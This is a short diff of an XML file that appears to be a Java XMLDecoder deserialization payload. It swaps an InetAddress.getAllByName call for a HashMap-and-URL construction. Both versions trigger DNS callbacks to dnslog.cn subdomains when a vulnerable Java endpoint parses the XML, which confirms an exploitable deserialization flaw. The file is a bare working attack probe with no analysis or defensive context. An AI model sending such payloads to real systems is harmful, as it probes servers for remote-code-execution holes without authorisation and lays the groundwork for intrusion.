@@ -1,7 +1,15 @@
 <java>
-<object class="java.net.InetAddress">
-    <method name="getAllByName">
-        <string>mmwewe.9x2i54.dnslog.cn</string>
-    </method>
-</object>
+<!--<object class="java.net.InetAddress">-->
+<!--    <method name="getAllByName">-->
+<!--        <string>mmwewe.9x2i54.dnslog.cn</string>-->
+<!--    </method>-->
+<!--</object>-->
+    <new class="java.util.HashMap">
+        <void method="put">
+            <new class="java.net.URL">
+                <string>http://wewe.yayxlu.dnslog.cn</string>
+            </new>
+            <string>x</string>
+        </void>
+    </new>
 </java>
